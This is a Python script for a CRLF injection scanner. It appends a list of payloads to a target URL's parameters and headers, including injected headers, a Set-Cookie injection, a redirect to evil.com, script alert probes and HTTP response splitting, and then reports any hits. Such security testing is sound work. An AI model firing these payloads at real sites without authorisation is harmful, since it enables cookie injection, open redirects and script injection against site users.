#!/usr/bin/env python3
"""
CRLF Injection Tester
Tests for CRLF (Carriage Return Line Feed) injection vulnerabilities
"""

import requests
import urllib.parse
import json
from datetime import datetime

class CRLFInjectionTester:
    """CRLF injection vulnerability tester"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        # CRLF injection payloads
        self.payloads = [
            '%0d%0aX-Injected-Header: Injected',
            '%0aX-Injected-Header: Injected',
            '%0dX-Injected-Header: Injected',
            '\r\nX-Injected-Header: Injected',
            '\nX-Injected-Header: Injected',
            '\rX-Injected-Header: Injected',
            '%0d%0a%20X-Injected-Header:%20Injected',
            '%0d%0aSet-Cookie: injected=true',
            '%0d%0aLocation: http://evil.com',
            '%0d%0a%0d%0a<script>alert(1)</script>',
            '\r\n\r\n<script>alert(1)</script>',
            '%E5%98%8A%E5%98%8DX-Injected-Header: Injected',  # Unicode encoding
            '%E5%98%8D%E5%98%8AX-Injected-Header: Injected',
            '%0d%0aContent-Length:%200%0d%0a%0d%0a',
            '%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>Injected</h1>',
        ]

    def scan(self):
        """Run CRLF injection scan"""
        print(f"[*] Starting CRLF injection scan on {self.target_url}")

        # Test GET parameters
        self._test_get_parameters()

        # Test common headers
        self._test_headers()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_get_parameters(self):
        """Test GET parameters for CRLF injection"""
        print("[*] Testing GET parameters...")

        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            params = {
                'url': ['http://example.com'],
                'redirect': ['http://example.com'],
                'return': ['http://example.com'],
                'page': ['home']
            }

        for param_name in params.keys():
            for payload in self.payloads:
                test_params = params.copy()
                original_value = params[param_name][0] if params[param_name] else ''
                test_params[param_name] = [original_value + payload]

                query_string = urllib.parse.urlencode(test_params, doseq=True, safe='%')
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

                if self._test_payload(test_url, param_name, payload, 'GET'):
                    return

    def _test_headers(self):
        """Test headers for CRLF injection"""
        print("[*] Testing headers...")

        headers_to_test = ['Referer', 'User-Agent', 'X-Forwarded-For']

        for header in headers_to_test:
            for payload in self.payloads[:5]:
                custom_headers = {header: payload}

                try:
                    response = self.session.get(
                        self.target_url,
                        headers=custom_headers,
                        timeout=10,
                        allow_redirects=False
                    )

                    if self._check_crlf(response, payload, header):
                        return True

                except Exception as e:
                    pass

        return False

    def _test_payload(self, url, param_name, payload, method):
        """Test single CRLF payload"""
        try:
            response = self.session.get(url, timeout=10, allow_redirects=False)

            if self._check_crlf(response, payload, param_name):
                return True

        except Exception as e:
            pass

        return False

    def _check_crlf(self, response, payload, location):
        """Check if CRLF injection was successful"""
        # Check for injected header
        if 'X-Injected-Header' in response.headers:
            vuln = {
                'type': 'CRLF Injection',
                'severity': 'high',
                'url': self.target_url,
                'location': location,
                'payload': payload,
                'evidence': f'Injected header found: X-Injected-Header: {response.headers.get("X-Injected-Header")}',
                'cwe': 'CWE-93'
            }
            self.vulnerabilities.append(vuln)
            print(f"[!] CRLF injection found in {location}")
            return True

        # Check for injected Set-Cookie
        set_cookie = response.headers.get('Set-Cookie', '')
        if 'injected=true' in set_cookie:
            vuln = {
                'type': 'CRLF Injection (Cookie Injection)',
                'severity': 'high',
                'url': self.target_url,
                'location': location,
                'payload': payload,
                'evidence': f'Injected cookie: {set_cookie}',
                'cwe': 'CWE-93'
            }
            self.vulnerabilities.append(vuln)
            print(f"[!] CRLF cookie injection found!")
            return True

        # Check for XSS via CRLF
        if '<script>' in response.text.lower() and 'alert(' in response.text.lower():
            vuln = {
                'type': 'CRLF Injection (XSS)',
                'severity': 'high',
                'url': self.target_url,
                'location': location,
                'payload': payload,
                'evidence': 'XSS payload injected via CRLF',
                'cwe': 'CWE-93'
            }
            self.vulnerabilities.append(vuln)
            print(f"[!] CRLF to XSS found!")
            return True

        return False

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 crlf_injection.py <url>")
        print("\nExample:")
        print("  python3 crlf_injection.py https://example.com/redirect?url=test")
        sys.exit(1)

    tester = CRLFInjectionTester(sys.argv[1])
    results = tester.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Vulnerabilities found: {len(results['vulnerabilities'])}")
